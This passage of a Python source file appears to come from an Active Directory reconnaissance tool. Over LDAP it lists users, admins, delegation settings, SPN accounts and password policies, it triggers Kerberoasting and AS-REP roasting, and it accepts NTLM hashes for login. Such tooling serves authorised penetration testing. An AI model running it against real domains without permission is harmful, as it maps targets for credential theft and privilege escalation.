                            Style.BRIGHT
                            + Fore.RED
                            + f"{key}: "
                            + Style.BRIGHT
                            + Fore.YELLOW
                            + f"{value}",
                        )
                    else:
                        print(
                            Style.BRIGHT
                            + Fore.GREEN
                            + f"{attribute["type"]}: "
                            + Style.BRIGHT
                            + Fore.YELLOW
                            + f"{value}",
                        )

            except Exception as e:
                logging.error("Skipping item, cannot process due to error %s" % str(e))
                pass

        print(Fore.YELLOW, Style.BRIGHT)
        # print(table)

    def get_acl(self):

        print(Style.NORMAL + Fore.GREEN + "\n[*] Start query a ACL detail")
        # controls = security_descriptor_control(sdflags=0x04)

        hashes = self.__lmhash + ":" + self.__nthash
        if hashes == ":":
            ldap_server, ldap_session = init_ldap_session(
                self.__domain,
                self.__username,
                self.__password,
                self.__lmhash,
                self.__nthash,
                self.__doKerberos,
                self.__kdcIP,
                False,
                None,
                self.__aesKey,
                False,
            )
        else:
            ldap_server, ldap_session = init_ldap_session(
                self.__domain,
                self.__username,
                self.__password,
                self.__lmhash,
                self.__nthash,
                self.__doKerberos,
                self.__kdcIP,
                False,
                hashes,
                self.__aesKey,
                False,
            )
        controls = security_descriptor_control(sdflags=0x07)
        ldap_session.extend.standard.paged_search(
            self.baseDN,
            detail_filter.replace("USERNAME", str(self.__acl_detail)),
            attributes=["nTSecurityDescriptor", "*"],
            controls=controls,
            paged_size=500,
            generator=False,
        )

        for entry in ldap_session.entries:
            json_entry = json.loads(entry.entry_to_json())
            attributes = json_entry["attributes"].keys()

            for attr in attributes:
                if attr == "nTSecurityDescriptor":
                    origin_value = entry[attr].value
                    f = open("/tmp/dump.dmp", "wb")
                    # output = bin2hex(entry[attr].value, "")
                    f.write(origin_value)
                    f.close()
                else:
                    print(f"[+] {str(attr)}: {entry[attr]}")
        # print(
        #     Style.NORMAL
        #     + Fore.GREEN
        #     + "[+] Total of records returned: "
        #     + Style.BRIGHT
        #     + Fore.RED
        #     + f"{len(resp) - 1}\n"
        #     + Style.NORMAL
        # )
        #
        # for item in resp:
        #     if isinstance(item, ldapasn1.SearchResultEntry) is not True:
        #         # print("[INFO]")
        #         continue
        #     try:
        #         for attribute in item["attributes"]:
        #             key = str(attribute["type"])
        #             print("[DEBUG] " + key)
        #             if key == "nTSecurityDescriptor":
        #                 value = ""
        #                 sd = ldaptypes.SR_SECURITY_DESCRIPTOR(
        #                     data=bytes(attribute["vals"][0])
        #                 )
        #                 for ace in sd["Dacl"].aces:
        #                     value += ace["Ace"]["Sid"].formatCanonical()
        #                     value += ", "
        #                 print(
        #                     Style.BRIGHT
        #                     + Fore.GREEN
        #                     + f"{attribute["type"]}: "
        #                     + Style.BRIGHT
        #                     + Fore.YELLOW
        #                     + f"{value}",
        #                 )
        #                 f = open("/tmp/dump.dmp", "w")
        #                 output = bin2hex(attribute["vals"][0], "")
        #                 f.write(str(output))
        #                 f.close()
        #
        #     except Exception as e:
        #         logging.error("Skipping item, cannot process due to error %s" % str(e))
        #         pass
        #
        # print(Fore.YELLOW, Style.BRIGHT)
        # print(table)

    def get_detail(self):
        print(Style.NORMAL + Fore.GREEN + "\n[*] Start query a object detail")
        resp = filter_search(
            self.__ldapConnection,
            detail_filter.replace("USERNAME", str(self.__detail)),
            None,
        )
        print(
            Style.NORMAL
            + Fore.GREEN
            + "[+] Total of records returned: "
            + Style.BRIGHT
            + Fore.RED
            + f"{len(resp) - 1}\n"
            + Style.NORMAL
        )
        for item in resp:
            if isinstance(item, ldapasn1.SearchResultEntry) is not True:
                continue
            try:
                for attribute in item["attributes"]:
                    key = str(attribute["type"])
                    if key == "nTSecurityDescriptor":
                        print("HELLO ACL")
                    if key == "objectSid":
                        data = bytes(attribute["vals"][0])
                        sid = format_sid(attribute["vals"][0])
                        value = sid
                    elif key == "objectGUID":
                        guid = uuid.bin_to_string(bytes(attribute["vals"][0]))
                        value = guid
                    else:
                        value = str(attribute["vals"][0])
                    if (
                        key == "msDS-AllowedToDelegateTo"
                        or key == "servicePrincipalName"
                        or key == "managedObjects"
                        or key == "memberOf"
                        or key == "member"
                        or key == "managedBy"
                        or key == "objectSid"
                    ):

                        print(
                            Style.BRIGHT
                            + Fore.RED
                            + f"{key}: "
                            + Style.BRIGHT
                            + Fore.YELLOW
                            + f"{value}",
                        )
                    elif key == "userAccountControl":
                        if int(attribute["vals"][0]) & UF_ACCOUNTDISABLE:
                            print(
                                Style.BRIGHT
                                + Fore.RED
                                + f"{key}: "
                                + Style.BRIGHT
                                + Fore.YELLOW
                                + f"{value}"
                                + Style.BRIGHT
                                + Fore.RED
                                + " (ACCOUNT DISABLE !)",
                            )
                        else:
                            print(
                                Style.BRIGHT
                                + Fore.RED
                                + f"{key}: "
                                + Style.BRIGHT
                                + Fore.YELLOW
                                + f"{value}",
                            )
                    elif key == "msDS-AllowedToActOnBehalfOfOtherIdentity":
                        value = ""
                        sd = ldaptypes.SR_SECURITY_DESCRIPTOR(
                            data=bytes(attribute["vals"][0])
                        )
                        for ace in sd["Dacl"].aces:
                            value += ace["Ace"]["Sid"].formatCanonical()
                            value += ", "

                        value = value[:-2]
                        print(
                            Style.BRIGHT
                            + Fore.RED
                            + f"{key}: "
                            + Style.BRIGHT
                            + Fore.YELLOW
                            + f"{value}",
                        )
                    else:
                        print(
                            Style.BRIGHT
                            + Fore.GREEN
                            + f"{attribute["type"]}: "
                            + Style.BRIGHT
                            + Fore.YELLOW
                            + f"{value}",
                        )

            except Exception as e:
                logging.error("Skipping item, cannot process due to error %s" % str(e))
                pass

        print(Fore.YELLOW, Style.BRIGHT)
        # print(table)

    def get_group_members(self):
        print(
            Style.NORMAL
            + Fore.GREEN
            + f"\n[*] Start query {self.__query_group} group members"
        )
        resp = filter_search(
            self.__ldapConnection,
            group_members_filter.replace("<GROUPNAME>", str(self.__query_group)),
            ["member"],
        )
        table = PrettyTable()
        table.field_names = [f"{self.__query_group} group members"]
        for item in resp:
            if isinstance(item, ldapasn1.SearchResultEntry) is not True:
                continue

            try:
                for attribute in item["attributes"]:
                    if str(attribute["type"]) == "member":
                        print(
                            Style.NORMAL
                            + Fore.GREEN
                            + f"[+] Total of records returned: "
                            + Style.BRIGHT
                            + Fore.RED
                            + f"{len(attribute["vals"])}"
                        )

                        for mem in attribute["vals"]:
                            table.add_row([mem])

            except Exception as e:
                logging.error("Skipping item, cannot process due to error %s" % str(e))
                pass
        print(Fore.YELLOW, Style.BRIGHT)
        print(table)

    def get_domain_admins(self):
        print(Style.NORMAL + Fore.GREEN + "\n[*] Start query domain admin")
        resp = filter_search(
            self.__ldapConnection, admin_filter, ["sAMAccountName", "description"]
        )
        table = PrettyTable()
        table.field_names = ["admin username", "description"]
        print(
            Style.NORMAL
            + Fore.GREEN
            + "[+] Total of records returned: "
            + Style.BRIGHT
            + Fore.RED
            + f"{len(resp) - 1}"
            + Style.NORMAL
        )
        for item in resp:
            if isinstance(item, ldapasn1.SearchResultEntry) is not True:
                continue
            name = None
            description = None
            try:
                for attribute in item["attributes"]:
                    if str(attribute["type"]) == "sAMAccountName":
                        name = str(attribute["vals"][0])
                    if str(attribute["type"]) == "description":
                        description = str(attribute["vals"][0])
                table.add_row([name, description])

            except Exception as e:
                logging.error("Skipping item, cannot process due to error %s" % str(e))
                pass
        print(Fore.YELLOW, Style.BRIGHT)
        print(table)

    def get_domain_users(self):
        print(Style.NORMAL + Fore.GREEN + "\n[*] Start query domain user")
        resp = filter_search(
            self.__ldapConnection, all_user_filter, ["sAMAccountName", "description"]
        )
        table = PrettyTable()
        table.field_names = ["username", "description"]
        print(
            Style.NORMAL
            + Fore.GREEN
            + "[+] Total of records returned: "
            + Style.BRIGHT
            + Fore.RED
            + f"{len(resp) - 1}"
            + Style.NORMAL
        )
        for item in resp:
            if isinstance(item, ldapasn1.SearchResultEntry) is not True:
                continue
            name = None
            description = None
            try:
                for attribute in item["attributes"]:
                    if str(attribute["type"]) == "sAMAccountName":
                        name = str(attribute["vals"][0])
                    if str(attribute["type"]) == "description":
                        description = str(attribute["vals"][0])
                table.add_row([name, description])

            except Exception as e:
                logging.error("Skipping item, cannot process due to error %s" % str(e))
                pass
        print(Fore.YELLOW, Style.BRIGHT)
        print(table)

    def get_domain_groups(self):
        print(Style.NORMAL + Fore.GREEN + "\n[*] Start query domain group")
        resp = filter_search(
            self.__ldapConnection, all_group_filter, ["sAMAccountName"]
        )
        table = PrettyTable()
        table.field_names = ["groups"]
        print(
            Style.NORMAL
            + Fore.GREEN
            + "[+] Total of records returned: "
            + Style.BRIGHT
            + Fore.RED
            + f"{len(resp)-1}"
            + Style.NORMAL
        )
        for item in resp:
            if isinstance(item, ldapasn1.SearchResultEntry) is not True:
                continue
            try:
                name = None
                for attribute in item["attributes"]:
                    if str(attribute["type"]) == "sAMAccountName":
                        name = str(attribute["vals"][0])
                table.add_row([name])
            except Exception as e:
                logging.error("Skipping item, cannot process due to error %s" % str(e))
                pass
        print(Fore.YELLOW, Style.BRIGHT)
        print(table)

    def get_domain_delegation(self):
        print(Style.NORMAL + Fore.GREEN + "\n[*] Start query domain delegation")
        resp = filter_search(
            self.__ldapConnection,
            delegation_filter,
            [
                "sAMAccountName",
                "userAccountControl",
                "msDs-AllowedToDelegateTo",
                "msDS-AllowedToActOnBehalfOfOtherIdentity",
            ],
        )
        table = PrettyTable()
        table.field_names = ["Account Name", "DelegationType", "To"]

        print(
            Style.NORMAL
            + Fore.GREEN
            + "[+] Total of records returned: "
            + Style.BRIGHT
            + Fore.RED
            + f"{len(resp) - 1}"
            + Style.NORMAL
        )

        for item in resp:
            if isinstance(item, ldapasn1.SearchResultEntry) is not True:
                continue
            name = ""
            userAccountControl = None
            protocolTransition = 0
            Target = ""
            delegation = ""
            for attribute in item["attributes"]:
                if str(attribute["type"]) == "sAMAccountName":
                    name = str(attribute["vals"][0])
            try:
                for attribute in item["attributes"]:
                    if str(attribute["type"]) == "sAMAccountName":
                        name = str(attribute["vals"][0])

                    if str(attribute["type"]) == "userAccountControl":
                        userAccountControl = str(attribute["vals"][0])

                        if int(userAccountControl) & UF_NOT_DELEGATED:
                            print("[!] Got a sensitive account! Can't not be delegated")
                            name += " (sensitive)"

                        if int(userAccountControl) & UF_TRUSTED_FOR_DELEGATION:
                            delegation = "Unconstrained"
                            Target = "N/A"
                            table.add_row([name, delegation, Target])
                        elif (
                            int(userAccountControl)
                            & UF_TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION
                        ):
                            # The "Use any authentication protocol" flag set
                            delegation = "Constrained w/ Protocol Transition"
                            protocolTransition = 1

                    if str(attribute["type"]) == "msDS-AllowedToDelegateTo":

                        # The "Use Kerberos Only" flag set
                        if protocolTransition == 0:
                            delegation = "Constrained"

                        for target in attribute["vals"]:
                            Target += f"{str(target)}\n"
                        Target = Target[:-1]

                        table.add_row([name, delegation, Target])
                    if (
                        str(attribute["type"])
                        == "msDS-AllowedToActOnBehalfOfOtherIdentity"
                    ):
                        Target = ""
                        sd = ldaptypes.SR_SECURITY_DESCRIPTOR(
                            data=bytes(attribute["vals"][0])
                        )
                        delegation = "RBCD"
                        for ace in sd["Dacl"].aces:
                            account_sid = ace["Ace"]["Sid"].formatCanonical()
                            Target += account_sid
                            Target += "\n"
                            # Then we can use account SID lookup :)
                        Target = Target[:-1]

                        table.add_row([name, delegation, Target])

            except Exception as e:
                logging.error("Skipping item, cannot process due to error %s" % str(e))
                pass

        print(Fore.YELLOW, Style.BRIGHT)
        print(table)

    def get_domain_controller(self):
        print(Style.NORMAL + Fore.GREEN + "\n[*] Start query domain controller")
        resp = filter_search(
            self.__ldapConnection,
            controllers_filter,
            ["sAMAccountName", "operatingSystem"],
        )
        table = PrettyTable()
        table.field_names = ["Domain Controller", "operatingSystem"]
        print(
            Style.NORMAL
            + Fore.GREEN
            + "[+] Total of records returned: "
            + Style.BRIGHT
            + Fore.RED
            + f"{len(resp) - 1}"
            + Style.NORMAL
        )
        for item in resp:
            if isinstance(item, ldapasn1.SearchResultEntry) is not True:
                continue
            name = None
            operatingSystem = None
            try:
                for attribute in item["attributes"]:
                    if str(attribute["type"]) == "sAMAccountName":
                        name = str(attribute["vals"][0])
                    if str(attribute["type"]) == "operatingSystem":
                        operatingSystem = str(attribute["vals"][0])
                table.add_row([name, operatingSystem])
            except Exception as e:
                logging.error("Skipping item, cannot process due to error %s" % str(e))
                pass

        print(Fore.YELLOW, Style.BRIGHT)
        print(table)

    def get_grained_password_policy(self):
        print(Style.NORMAL + Fore.GREEN + "\n[*] Start query grained password policy")
        resp = filter_search(
            self.__ldapConnection,
            grained_password_policies_filter,
            [
                "cn",
                "msDS-PasswordSettingsPrecedence",
                "msDS-MinimumPasswordLength",
                "msDS-PasswordComplexityEnabled",
                "msDS-PasswordReversibleEncryptionEnabled",
                "msDS-LockoutThreshold",
                "msDS-LockoutDuration",
                "msDS-LockoutObservationWindow",
                "msDS-PasswordHistoryLength",
                "msDS-MaximumPasswordAge",
                "msDS-MinimumPasswordAge",
                "msDS-PSOAppliesTo",
            ],
        )

        print(
            Style.NORMAL
            + Fore.GREEN
            + "[+] Total of records returned: "
            + Style.BRIGHT
            + Fore.RED
            + f"{len(resp) - 1}\n"
            + Style.NORMAL
        )
        for item in resp:
            if isinstance(item, ldapasn1.SearchResultEntry) is not True:
                continue
            cn = None
            try:
                for attribute in item["attributes"]:
                    print(
                        Style.BRIGHT
                        + Fore.GREEN
                        + f"{attribute["type"]}: "
                        + Style.BRIGHT
                        + Fore.YELLOW
                        + f"{attribute["vals"][0]}",
                    )

            except Exception as e:
                logging.error("Skipping item, cannot process due to error %s" % str(e))
                pass

    def get_password_policy(self):
        print(Style.NORMAL + Fore.GREEN + "\n[*] Start query password policy")
        resp = filter_search(
            self.__ldapConnection,
            password_policy_filter,
            [
                "minPwdLength",
                "pwdProperties",
                "lockoutThreshold",
                "lockoutDuration",
                "pwdHistoryLength",
                "maxPwdAge",
                "minPwdAge",
            ],
        )
        table = PrettyTable()
        table.field_names = [
            "minPwdLength",
            "pwdProperties",
            "lockoutThreshold",
            "lockoutDuration",
            "pwdHistoryLength",
            "maxPwdAge",
            "minPwdAge",
        ]
        print(
            Style.NORMAL
            + Fore.GREEN
            + "[+] Total of records returned: "
            + Style.BRIGHT
            + Fore.RED
            + f"{len(resp) - 1}\n"
            + Style.NORMAL
        )
        for item in resp:
            if isinstance(item, ldapasn1.SearchResultEntry) is not True:
                continue
            try:
                for attribute in item["attributes"]:
                    print(
                        Style.BRIGHT
                        + Fore.GREEN
                        + f"{attribute["type"]}: "
                        + Style.BRIGHT
                        + Fore.YELLOW
                        + f"{attribute["vals"][0]}",
                    )

            except Exception as e:
                logging.error("Skipping item, cannot process due to error %s" % str(e))
                pass

    def get_domain_computers(self):
        print(Style.NORMAL + Fore.GREEN + "\n[*] Start query domain computers")
        resp = filter_search(
            self.__ldapConnection,
            all_computer_filter,
            ["sAMAccountName", "operatingSystem"],
        )
        table = PrettyTable()
        table.field_names = ["computers", "operatingSystem"]
        print(
            Style.NORMAL
            + Fore.GREEN
            + "[+] Total of records returned: "
            + Style.BRIGHT
            + Fore.RED
            + f"{len(resp) - 1}"
            + Style.NORMAL
        )
        for item in resp:
            if isinstance(item, ldapasn1.SearchResultEntry) is not True:
                continue
            name = None
            operatingSystem = None
            try:
                for attribute in item["attributes"]:
                    if str(attribute["type"]) == "sAMAccountName":
                        name = str(attribute["vals"][0])
                    if str(attribute["type"]) == "operatingSystem":
                        operatingSystem = str(attribute["vals"][0])
                table.add_row([name, operatingSystem])
            except Exception as e:
                logging.error("Skipping item, cannot process due to error %s" % str(e))
                pass

        print(Fore.YELLOW, Style.BRIGHT)
        print(table)

    def run(self):
        if self.__kdcHost is not None and self.__targetDomain == self.__domain:
            self.__target = self.__kdcHost
        else:
            if self.__kdcIP is not None and self.__targetDomain == self.__domain:
                self.__target = self.__kdcIP
            else:
                self.__target = self.__targetDomain
        try:
            # Connection Target LDAP Host
            if DEBUG_MODULE:
                print(
                    Fore.GREEN
                    + "[*] LDAP Connection String: "
                    + Style.BRIGHT
                    + "ldap://%s" % self.__target,
                    self.baseDN,
                    self.__kdcIP,
                )
            ldapConnection = ldap.LDAPConnection(
                "ldap://%s" % self.__target, self.baseDN, self.__kdcIP
            )

            if self.__doKerberos is not True:
                ldapConnection.login(
                    self.__username,
                    self.__password,
                    self.__domain,
                    self.__lmhash,
                    self.__nthash,
                )
            else:
                ldapConnection.kerberosLogin(
                    self.__username,
                    self.__password,
                    self.__domain,
                    self.__lmhash,
                    self.__nthash,
                    self.__aesKey,
                    kdcHost=self.__kdcIP,
                )
        except ldap.LDAPSessionError as e:
            if str(e).find("strongerAuthRequired") >= 0:
                # We need to try SSL
                ldapConnection = ldap.LDAPConnection(
                    "ldaps://%s" % self.__target, self.baseDN, self.__kdcIP
                )
                if self.__doKerberos is not True:
                    ldapConnection.login(
                        self.__username,
                        self.__password,
                        self.__domain,
                        self.__lmhash,
                        self.__nthash,
                    )
                else:
                    ldapConnection.kerberosLogin(
                        self.__username,
                        self.__password,
                        self.__domain,
                        self.__lmhash,
                        self.__nthash,
                        self.__aesKey,
                        kdcHost=self.__kdcIP,
                    )
            else:
                if str(e).find("NTLMAuthNegotiate") >= 0:
                    print(Fore.RED)
                    logging.critical(
                        "NTLM negotiation failed. Probably NTLM is disabled. Try to use Kerberos "
                        "authentication instead"
                    )
                else:
                    if self.__kdcIP is not None and self.__kdcHost is not None:
                        print(Fore.RED)
                        logging.critical(
                            "If the credentials are valid, check the hostname and IP address of KDC. They "
                            "must match exactly each other"
                        )
                raise
        print(Style.BRIGHT + Fore.GREEN)
        print("[+] Login Successfully" + Style.NORMAL)
        self.__ldapConnection = ldapConnection
        if options.qall is True:
            self.get_domain_users()
            self.get_domain_groups()
            self.get_domain_computers()
            self.get_domain_admins()
            self.get_blocked_user()
            self.get_domain_controller()
            self.get_spn_user()
            self.ASREPRoast()
            self.get_password_policy()
            self.get_grained_password_policy()
            exit()
        if options.qu is True:
            self.get_domain_users()
        if options.qg is True:
            self.get_domain_groups()
        if options.qc is True:
            self.get_domain_computers()
        if options.qa is True:
            self.get_domain_admins()
        if options.qgm:
            self.__query_group = str(options.qgm)
            self.get_group_members()
        if options.qbu:
            self.get_blocked_user()
        if options.qs:
            self.__detail_sid = options.qs
            self.get_sid_detail()
        if options.qdc:
            self.get_domain_controller()
        if options.qd:
            self.get_domain_delegation()
        if options.qpp:
            self.get_password_policy()
        if options.qfpp:
            self.get_grained_password_policy()
        if options.detail:
            self.__detail = options.detail
            self.get_detail()
        if options.acl:
            self.__acl_detail = options.acl
            self.get_acl()
        if options.qasrep:
            if options.request_user:
                if options.o:
                    self.__outputFileName = options.o
                self.__request_user = str(options.request_user)
                self.ASREPRoast()
            else:
                self.ASREPRoast()
        if options.qspn:
            if options.request_user:
                if options.o:
                    self.__outputFileName = options.o
                self.__kerberoast_username = str(options.request_user)
                self.Kerberoast()
            else:
                self.get_spn_user()
        if options.qsspn:
            if options.request_user:
                if options.o:
                    self.__outputFileName = options.o
                self.__kerberoast_username = str(options.request_user)
                self.Kerberoast()
            else:
                self.get_sspn_user()


if __name__ == "__main__":
    # print(version.BANNER)

    parser = argparse.ArgumentParser(
        add_help=True, description="Queries target domain for delegation relationships "
    )

    parser.add_argument("target", action="store", help="domain[/username[:password]]")
    parser.add_argument(
        "-qall",
        action="store_true",
        help="Query domain users/groups/computers/admins/controller/blocked_users",
    )
    parser.add_argument("-qu", action="store_true", help="Query domain users")
    parser.add_argument("-qg", action="store_true", help="Query domain groups")
    parser.add_argument("-qc", action="store_true", help="Query domain computers")
    parser.add_argument("-qa", action="store_true", help="Query domain admins")
    parser.add_argument("-qdc", action="store_true", help="Query domain controller")
    parser.add_argument("-qbu", action="store_true", help="Query domain blocked user")
    parser.add_argument("-qd", action="store_true", help="Query domain Delegation")
    parser.add_argument(
        "-qpp", action="store_true", help="Query domain password policy"
    )
    parser.add_argument(
        "-qfpp", action="store_true", help="Query domain fine grained password policy"
    )
    parser.add_argument(
        "-qasrep", action="store_true", help="Query domain DONT_REQ_PREAUTH users"
    )
    parser.add_argument("-qspn", action="store_true", help="Query domain SPN users")
    parser.add_argument(
        "-qsspn",
        action="store_true",
        help="Query domain SPN users (Removes the 'servicePrincipalName' filter)",
    )
    parser.add_argument(
        "-qgm", metavar="GROUP_NAME", action="store", help="Query a group members"
    )
    parser.add_argument("-qs", metavar="SID", action="store", help="Query a sid detail")
    parser.add_argument("-o", action="store", help="Save Path")
    parser.add_argument(
        "-request-user",
        metavar="USER_NAME",
        action="store",
        help="Requests TGS for the SPN associated to the user specified (just username)",
    )
    parser.add_argument(
        "-detail",
        metavar="OBECJT_NAME",
        action="store",
        help="Query a Object detail",
    )
    parser.add_argument(
        "-acl",
        metavar="OBECJT_NAME",
        action="store",
        help="Query a acl detail",
    )
    parser.add_argument(
        "-target-domain",
        action="store",
        help="Domain to query/request if different than the domain of the user. "
        "Allows for retrieving delegation info across trusts.",
    )

    parser.add_argument(
        "-ts", action="store_true", help="Adds timestamp to every logging output"
    )
    parser.add_argument("-debug", action="store_true", help="Turn DEBUG output ON")

    group = parser.add_argument_group("authentication")
    group.add_argument(
        "-hashes",
        action="store",
        metavar="LMHASH:NTHASH",
        help="NTLM hashes, format is LMHASH:NTHASH",
    )
    group.add_argument(
        "-no-pass", action="store_true", help="don't ask for password (useful for -k)"
    )
    group.add_argument(
        "-k",
        action="store_true",
        help="Use Kerberos authentication. Grabs credentials from ccache file "
        "(KRB5CCNAME) based on target parameters. If valid credentials "
        "cannot be found, it will use the ones specified in the command "
        "line",
    )
    group.add_argument(
        "-aesKey",
        action="store",
        metavar="hex key",
        help="AES key to use for Kerberos Authentication " "(128 or 256 bits)",
    )

    group = parser.add_argument_group("connection")
    group.add_argument(
        "-dc-ip",
        action="store",
        metavar="ip address",
        help="IP Address of the domain controller. If "
        "ommited it use the domain part (FQDN) "
        "specified in the target parameter. Ignored"
        "if -target-domain is specified.",
    )
    group.add_argument(
        "-dc-host",
        action="store",
        metavar="hostname",
        help="Hostname of the domain controller to use. "
        "If ommited, the domain part (FQDN) "
        "specified in the account parameter will be used",
    )

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()
    logger.init(options.ts)

    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
        logging.debug(version.getInstallationPath())
        DEBUG_MODULE = True
    else:
        logging.getLogger().setLevel(logging.INFO)

    userDomain, username, password = parse_credentials(options.target)

    if userDomain == "":
        print(Fore.RED)
        logging.critical("userDomain should be specified!")
        sys.exit(1)

    if options.target_domain:
        targetDomain = options.target_domain
    else:
        targetDomain = userDomain

    if (
        password == ""
        and username != ""
        and options.hashes is None
        and options.no_pass is False
        and options.aesKey is None
    ):
        from getpass import getpass

        print(Fore.GREEN)
        print(Style.BRIGHT)
        password = getpass("[>] Enter Password:")
        print(Style.NORMAL)

    if options.aesKey is not None:
        options.k = True

    if options.request_user is not None:
        if options.qspn is False and options.qsspn is False and options.qasrep is False:

            print(Fore.RED)
            print("[-] -request-user must used with -qspn/-qsspn/-qasrep")
            exit()

    try:
        executer = QuickWin(username, password, userDomain, targetDomain, options)
        executer.run()
    except Exception as e:
        print(Fore.RED)
        if logging.getLogger().level == logging.DEBUG:
            import traceback

            traceback.print_exc()
        logging.error(str(e))
    print(Style.RESET_ALL)
